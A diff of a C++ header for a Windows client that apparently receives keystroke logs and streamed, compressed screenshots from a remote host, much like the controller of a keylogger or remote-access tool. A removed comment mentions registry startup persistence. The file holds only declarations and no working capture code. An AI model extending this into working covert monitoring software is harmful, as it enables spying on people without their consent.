@@ -1,5 +1,6 @@
-//NOTE put in the startup/regedit thing
-//NOTE gotta make a function to handle errors
+#ifndef KEYCLIENT_H_
+#define KEYCLIENT_H_
+
 #include <windows.h>
 #include <windowsx.h>
 #include <string>
@@ -12,12 +13,11 @@
 
 #pragma pack(1)
 
-//#include <wchar.h>
 #include "resource.h"
 #define WIN32_LEAN_AND_MEAN
 #define BUFFER_SZ 5000
 
-//custom defined id's I have them here since my resource editor cant edit things in main window. You may or may not need so modify as needed
+//custom defined id's I like to use createwindowex in wm_create for main window.
 #define MAIN_WINDOW_BUTTONMSG1  4043
 #define CONNECT_TO_HOST         1997
 #define IPADDR_EDIT             1819
@@ -38,7 +38,7 @@ using std::stringstream;
 using std::map;
 using std::string;
 
-//Function definition :3
+//Function definitions :3
 LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
 BOOL CALLBACK AboutDlgProc(HWND, UINT, WPARAM , LPARAM);
 BOOL CALLBACK EmailMeDlg(HWND , UINT, WPARAM , LPARAM);
@@ -64,6 +64,7 @@ extern string keylog;
 typedef struct IMAGE_PKT_HEADER{
 
     //make sure to ntohl the ints.
+    int screen_ratio;
     BITMAPINFOHEADER bitmaphdr;
     int packet_expected;
     int origx, origy;
@@ -71,6 +72,8 @@ typedef struct IMAGE_PKT_HEADER{
     ULONG compressed_Size; //compressed
 
 }IMAGE_PKT_HEADER;
+
+extern RECT click_rectangle;
 
 
 //for the BITMAPINFOHEADER i use NTOHL right? not HTONL
@@ -83,13 +86,16 @@ typedef struct PKT{
 
 }PKT;
 
-    extern bool pkt_complete;
-    extern int bitcounter;
+    extern bool pkt_complete, pict_is_streaming, right_click;
+    extern int bitcounter, framesdrawn;
 
     extern unsigned char *bitmapbuf, *bitmapbuf_compressed;
+
+    extern char szClassName[];
 
     extern IMAGE_PKT_HEADER hdrpkt;
     extern BITMAPINFOHEADER bi;
     extern HDC handle_WindowDC;
     extern PAINTSTRUCT paintstruct;
 
+#endif
